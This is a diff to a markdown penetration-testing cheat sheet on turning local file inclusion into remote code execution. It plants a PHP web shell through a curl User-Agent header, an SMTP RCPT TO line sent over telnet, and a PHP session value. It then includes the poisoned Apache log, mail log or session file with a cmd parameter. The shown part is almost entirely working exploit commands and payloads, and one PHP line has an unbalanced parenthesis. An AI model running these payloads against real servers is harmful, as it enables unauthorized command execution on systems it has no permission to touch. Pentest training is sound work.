@@ -749,7 +749,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
   
 or
   
-`curl -s http://ip/index.php -A '\<?php system($_GET[‘cmd’]); ?>'`  
+`curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'`  
   
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
   
@@ -757,7 +757,7 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 
 `telnet ip 23`  
 `MAIL FROM: email@gmail.com`    
-`RCPT TO: \<?php system($_GET[‘cmd’]); ?>`  
+`RCPT TO: <?php system($_GET[‘cmd’]); ?>`  
 `http://ip/index.php?file=/var/mail/mail.log&cmd=id`  
   
 -> ssh
@@ -768,7 +768,7 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 
 -> PHP session
 
-`http://ip/index.php?file= \<?php system($_GET["cmd"];?>`  
+`http://ip/index.php?file=<?php system($_GET["cmd"];?>`  
 `http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
   
 -> Other Paths  
